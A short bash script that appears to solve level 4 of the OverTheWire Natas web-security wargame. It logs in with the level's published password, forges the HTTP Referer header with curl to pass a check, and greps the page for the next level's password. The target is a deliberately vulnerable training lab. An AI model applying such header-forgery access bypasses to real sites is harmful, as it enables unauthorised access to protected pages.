#!/bin/bash

# this page require us to come from specific url
# set the referer field using -e

USER=natas4
PASS='QryZXc2e0zahULdHrtHxzyYkj59kUxLQ'

curl -fsSL -u $USER:$PASS \
  -e "http://natas5.natas.labs.overthewire.org/" \
  http://natas4.natas.labs.overthewire.org | grep password
